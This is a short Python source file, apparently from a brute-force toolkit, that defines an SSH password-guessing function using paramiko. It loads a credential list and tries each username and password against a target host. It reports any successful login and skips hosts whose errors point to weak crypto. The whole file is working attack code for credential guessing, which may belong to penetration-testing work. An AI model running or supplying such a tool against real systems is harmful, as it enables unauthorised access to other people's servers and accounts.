import paramiko
from bruteforce.credentials_loader import load_credentials
import warnings

def ssh_bruteforce(ip, port=22):
    creds = load_credentials()
    print(f"[*] Trying SSH brute-force on {ip}:{port}")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username, password in creds:
        try:
            client.connect(ip, port=port, username=username, password=password, timeout=3)
            print(f"[+] SSH login success: {username}:{password}")
            client.close()
            return (username, password)

        except (paramiko.ssh_exception.SSHException, ValueError) as e:
            if "DSA" in str(e) or "key size" in str(e) or "no matching key exchange" in str(e) or "p must be" in str(e):
                print(f"[!] Insecure SSH service detected on {ip}:{port} — {str(e)}")
                print("[-] Skipping brute-force due to insecure crypto configuration.")
                return None
            continue

        except Exception:
            continue

    print("[-] No valid SSH credentials found.")
    return None
